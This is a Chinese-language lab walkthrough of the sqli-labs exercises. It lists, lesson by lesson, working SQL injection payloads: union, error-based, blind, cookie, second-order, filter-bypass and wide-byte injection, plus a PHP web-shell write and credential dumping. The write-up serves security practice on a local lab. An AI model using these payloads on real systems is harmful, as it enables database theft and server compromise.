
### Lesson 1

随手加个单引号试试：
```
http://localhost:81/Less-1/?id=-1'
```

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''-1'' LIMIT 0,1' at line 1
```

注意观察 -1 后面有两个单引号，去掉我们自己加的一个，说明变量是用一个单引号包裹的

那么直接构造就好了
```
http://localhost:81/Less-1/?id=-1' union select 1, user(), '3
```

### Lesson 2

同样的思路
```
http://localhost:81/Less-2/?id=-1 union select 1, user(), 3
```

### Lesson 3

```
http://localhost:81/Less-3/?id=-1') union select 1, user(), ('2
```

### Lesson 4

```
http://localhost:81/Less-4/?id=-1") union select 1, user(), ("2
```

### Lesson 5

报错注入：
```
http://localhost:81/Less-5/?id=-1' union select updatexml(1, concat(0x7e, (select user()), 0x7e), 1), 2, '3
```

### Lesson 6

```
http://localhost:81/Less-6/?id=1" union select updatexml(1, concat(0x7e, (select user()), 0x7e), 1), 2, "3
```

### Lesson 7

```
http://localhost:81/Less-7/?id=1')) union select 1, 2, "<?php eval($_GET['x']) ?>" into outfile '/var/www/html/shell.php' --+
```

写入权限不足，可能是因为 docker 打包导致的？

### Lesson 8

构造布尔表达式
```
http://localhost:81/Less-8/?id=1' and (select database() = 'security') and '1'='1
```

### Lesson 9

构造布尔表达式，基于时间的盲注
```
http://localhost:81/Less-9/?id=1' and substr((select database()), 1, 1) = 's' and sleep(3) and '1'='1
```

### Lesson 10

```
http://localhost:81/Less-10/?id=1" and substr((select database()), 1, 1) = 's' and sleep(3) and "1" = "1
```

### Lesson 11

```
passwd=admin' or '1'='1&submit=Submit&uname=admin
```

```
passwd=unknown' union select database(), '2&submit=Submit&uname=admin
```

### Lesson 12

```
passwd=unknown") or 1=("1&submit=Submit&uname=admin
```

```
passwd=unknown") union select database(), ("2&submit=Submit&uname=admin
```

### Lesson 13

```
passwd=unknown') or 1=('1&submit=Submit&uname=admin
```

```
passwd=unknown') union select if(substr((select database()), 1, 1) = 's', sleep(3), 1), ('2&submit=Submit&uname=admin
```

### Lesson 14

```
passwd=unknown" or 1="1&submit=Submit&uname=admin
```

```
passwd=unknown" or substr((select database()), 1, 1) = "s&submit=Submit&uname=admin
```

### Lesson 15

```
passwd=unknown' or 1='1&submit=Submit&uname=admin
```

```
passwd=unknown' or substr((select database()), 1, 1) ='s&submit=Submit&uname=admin
```

### Lesson 16

```
passwd=unknown") or 1=("1&submit=Submit&uname=admin
```

```
passwd=unknown") or substr((select database()), 1, 1) = ("s&submit=Submit&uname=admin
```

### Lesson 17

翻了一下代码，发现 username 有过滤但 password 没有

```
passwd=admin' or sleep(3) or '1&submit=Submit&uname=Dhakkan
```

有延迟，说明是单引号

```
passwd=unknown' or updatexml(1, concat(0x7e, (select database()), 0x7e), 1) or '1&submit=Submit&uname=Dhakkan
```

惊了，set 之后居然是可以接布尔表达式的

```
mysql> update users set password='unknown' or sleep(3) where username='dhakkan';
Query OK, 0 rows affected, 1 warning (3.03 sec)
Rows matched: 1  Changed: 0  Warnings: 1

mysql> show warnings;
+---------+------+---------------------------------------------+
| Level   | Code | Message                                     |
+---------+------+---------------------------------------------+
| Warning | 1292 | Truncated incorrect DOUBLE value: 'unknown' |
+---------+------+---------------------------------------------+
1 row in set (0.00 sec)
```

看样子似乎是把 `'unknown' or sleep(3)` 表达式求值之后，再转换成 varchar 然后写入数据库（存疑

那这里新的 password 取值就有讲究了，因为 `unknown` 转成 bool 类型之后会变成 false，如果后边接布尔表达式用的是 and 的话会被短路掉，不会执行

```
passwd=1' and if((substr((select database()), 1, 1) = 's'), sleep(3), 1) and 1 = '1&submit=Submit&uname=Dhakkan
```

### Lesson 18

报错注入：

```
1' and (select updatexml(1, concat(0x7e, (select database()), 0x7e), 1)) or '1
```

时间盲注：

```
1' and if(substr((select database()), 1, 1) = 's', sleep(3), 1) or '1
```

### Lesson 19

```
http://localhost:81/Less-19/' or (select updatexml(1, concat(0x7e, (select database()), 0x7e), 1)) or '1
```

```
http://localhost:81/Less-19/' or if(substr((select database()), 1, 1) = 's', sleep(3), 1) or '1
```

### Lesson 20

给个用户名可以直接报出密码

```
$ curl -L -H "Cookie: uname=admin" "http://localhost:81/Less-20/index.php"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>Less-20 Cookie Injection- Error Based- string</title>
</head>

<body bgcolor="#000000">

<center><br><br><br><img src="../images/Less-20.jpg" /><br><br><b><br><font color= "red" font size="4">YOUR USER AGENT IS : curl/8.7.1</font><br><font color= "cyan" font size="4">YOUR IP ADDRESS IS : 192.168.215.1</font><br><font color= "#FFFF00" font size = 4 >DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br><font color= "orange" font size = 5 >YOUR COOKIE : uname = admin and expires: Thu 26 Dec 2024 - 07:44:38<br></font><font color= "pink" font size="5">Your Login name:admin<br><font color= "grey" font size="5">Your Password:admin</font></b><br>Your ID:8<center><form action="" method="post"><input  type="submit" name="submit" value="Delete Your Cookie!" /></form></center><br><br><br><br>
</body>
</html>

```

cookie 中传递的 `uname` 没有任何过滤

```
uname=unknown' union select database(), 2, '3
```

### Lesson 21

cookie 中多做了一层 base64，同样的可以直接爆密码

```
❮ curl -L -H "Cookie: uname=YWRtaW4" "http://localhost:81/Less-21/index.php"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>Less-21 Cookie Injection- Error Based- complex - string</title>
</head>

<body bgcolor="#000000">

<center><br><br><br><b><img src="../images/Less-21.jpg" /><br><br><b><br><font color= "red" font size="4">YOUR USER AGENT IS : curl/8.7.1</font><br><font color= "cyan" font size="4">YOUR IP ADDRESS IS : 192.168.215.1</font><br><font color= "#FFFF00" font size = 4 >DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br><font color= "orange" font size = 5 >YOUR COOKIE : uname = YWRtaW4= and expires: Thu 26 Dec 2024 - 09:11:25<br></font><font color= "pink" font size="5">Your Login name:admin<br><font color= "grey" font size="5">Your Password:admin</font></b><br>Your ID:8<center><form action="" method="post"><input  type="submit" name="submit" value="Delete Your Cookie!" /></form></center><br><br><br><br>
</body>
</html>
```

```
uname=dW5rbm93bicpIHVuaW9uIHNlbGVjdCBkYXRhYmFzZSgpLCAyLCAoJzMK
```

### Lesson 22

同样

```
❮ curl -L -H "Cookie: uname=YWRtaW4" "http://localhost:81/Less-22/index.php"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>Less-22 Cookie Injection- Error Based- Double Quotes - string</title>
</head>

<body bgcolor="#000000">

<center><br><br><br><b><img src="../images/Less-21.jpg" /><br><br><b><br><font color= "red" font size="4">YOUR USER AGENT IS : curl/8.7.1</font><br><font color= "cyan" font size="4">YOUR IP ADDRESS IS : 192.168.215.1</font><br><font color= "#FFFF00" font size = 4 >DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br><font color= "orange" font size = 5 >YOUR COOKIE : uname = YWRtaW4 and expires: Thu 26 Dec 2024 - 09:17:25<br></font><font color= "pink" font size="5">Your Login name:admin<br><font color= "grey" font size="5">Your Password:admin</font></b><br>Your ID:8<center><form action="" method="post"><input  type="submit" name="submit" value="Delete Your Cookie!" /></form></center><br><br><br><br>
</body>
</html>
```

```
uname=dW5rbm93biIgdW5pb24gc2VsZWN0IGRhdGFiYXNlKCksIDIsICIzCg==
```

### Lesson 23

```
http://localhost:81/Less-23/?id=-1' union select 1, database(), '3
```

```
http://localhost:81/Less-23/?id=-1' union select 1, updatexml(1, concat(0x7e, (select database()), 0x7e), 1), '3
```

```
http://localhost:81/Less-23/?id=1' and substr((select database()), 1, 1) = 's' and sleep(3) and '1
```

### Lesson 24

1. 注册用户：username = `admin' or 1='1`，密码随意。
2. 登陆用户
3. 修改密码，`admin` 用户的密码会被修改。

- ~~注册用户：username = `password=123&re_password=123&submit=Register&username=admin' and substr((select database()), 1, 1) = 's' and sleep(3) and '1`~~
	- 行不通，因为 `users` 表中username 字段类型为 `varchar(20)`，太小了

### Lesson 25

```
http://localhost:81/Less-25/?id=-1' union select 1, database(), '3
```

双写绕过

```
http://localhost:81/Less-25/?id=1' anandd if(substr((select database()), 1, 1) = 's', sleep(3), 0) aandnd '1
```

使用 `&&` 和 `||`

```
http://localhost:81/Less-25/?id=1' %26%26 if(substr((select database()), 1, 1) = 's', sleep(3), 0) %26%26 '1
```

### Lesson 25a

```
http://localhost:81/Less-25a/?id=-1%20union%20select%201,%20database(),%203
```

过滤了 AND 和 OR，使用符号绕过

### Lesson 26

```
http://localhost:81/Less-26/?id=1'%26%26if(substr((database()),1,1)='s',sleep(3),1)%26%26'1
```

过滤了空格，可以采用其他空白字符替换：

`%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%a0`

测试 `%0b` 和 `%a0` 可以

```
http://localhost:81/Less-26/?id=100%27%0bunion%0bselect%0b1,%0bdatabase(),%0b%273
```

过滤了 AND 和 OR，可以用 `&&` 和 `||` 代替

过滤注释符好像绕不过去，傻逼 sqlmap 构造的 payload 总想最后加个注释符，所以没法用

### Lesson 26a

```
http://localhost:81/Less-26a/?id=100%27)%0bunion%0bselect%0b1,database(),(%273
```

### Lesson 27

双写，大小写应该都能绕过

```
http://localhost:81/Less-27/?id=100'%0bunIon%0bseLect%0b1,database(),'3
```

```
http://localhost:81/Less-27/?id=100'%0buniunionon%0bseleseselectlectct%0b1,database(),'3
```

### Lesson 27a

双写，大小写绕过

```
http://localhost:81/Less-27a/?id=100"%0bunIon%0bselEct%0b1,database(),"3
```

```
http://localhost:81/Less-27a/?id=100"%0buniunionon%0bseleseleselectctct%0b1,database(),"3
```

### Lesson 28

```
http://localhost:81/Less-28/?id=100')%0bunion%0bselect%0b1,database(),('3
```

### Lesson 28a

```
http://localhost:81/Less-28a/?id=100')%0bunion%0bselect%0b1,database(),('3
```

### Lesson 29

?

```
http://localhost:81/Less-29/?id=100' union select 1, database(), '3
```

HTTP Parameter Pollution

```
http://localhost:81/Less-29/login.php?id=1&id=100' union select 1, database(), '3
```

### Lesson 30

```
http://localhost:81/Less-30/?id=100" union select 1, database(), "3
```

```
http://localhost:81/Less-30/login.php?id=1&id=100" union select 1, database(), "3
```

### Lesson 31

```
http://localhost:81/Less-31/?id=100") union select 1, database(), ("3
```

```
http://localhost:81/Less-31/login.php?id=1&id=100") union select 1, database(), ("3
```

### Lesson 32

宽字节注入

```
http://localhost:81/Less-32/?id=100%df' union select 1, database(), 3 --+
```

这个好像就不好凑后面的引号了

### Lesson 33

```
http://localhost:81/Less-33/?id=100%df' union select 1, database(), 3 --+
```

### Lesson 34

```
uname=admin%df' union select 1, group_concat(username, password) from users -- &passwd=unknown&submit=Submit
```

### Lesson 35

```
http://localhost:81/Less-35/?id=100 union select 1, database(), 3
```

### Lesson 36

```
http://localhost:81/Less-36/?id=100%df' union select 1, database(), 3 --+
```

### Lesson 37

```
uname=admin%df' union select 1, group_concat(username, password) from users -- &passwd=unknown&submit=Submit
```